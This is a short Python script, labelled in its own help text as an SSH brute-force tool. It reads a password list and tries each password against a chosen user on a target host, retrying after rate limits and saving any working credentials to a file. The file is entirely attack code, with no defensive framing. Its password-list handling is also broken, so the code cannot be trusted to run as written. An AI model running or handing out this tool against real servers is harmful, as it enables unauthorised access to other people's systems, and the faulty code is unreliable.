from paramiko import AuthenticationException, SSHClient, AutoAddPolicy, SSHException
import socket
import time
import argparse
from threading import Thread
from colorama import init, Fore

init()
GREEN = Fore.GREEN
RED = Fore.RED
RESET = Fore.RESET
BLUE = Fore.BLUE


def ssh_checker(hostname, username, password):
    c = SSHClient()
    c.set_missing_host_key_policy(AutoAddPolicy())
    try:
        c.connect(hostname=hostname, username=username, password=password)
    except socket.timeout:
        print(f"{RED}[!] Host: {hostname} is unreachable, timed out.{RESET}")
        return False
    except AuthenticationException:
        print(f"[!] Invalid credentials for {username}:{password}")
        return False
    except SSHException:
        print(f"{BLUE}[*] Quota exceeded, retrying with delay...{RESET}")
        time.sleep(60)
        return ssh_checker(hostname, username, password)
    else:
        print(
            f"{GREEN}[+] Found combination: \n\t)HOSTNAME: {hostname}\n\tUSERNAME: {username}\n"
            f"\tPASSWORD: {password}{RESET} "
        )
        return True


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SSH Bruteforce script.")
    parser.add_argument("host", help="Hostname or IP Address of SSH Server.")
    parser.add_argument(
        "-P", "--passlist", help="File that contain password list in each line."
    )
    parser.add_argument("-U", "--user", help="Login username")

    args = parser.parse_args()
    host = args.host
    passlist = args.passlist
    user = args.user
    with open(passlist).read() as readlist:
        take_form_list = readlist.splitlines()
    for password in take_form_list:
        if ssh_checker(host, user, password):
            with open("credential_pairs.txt", "w") as w:
                w.write(f"{user}@{host}: {password}")
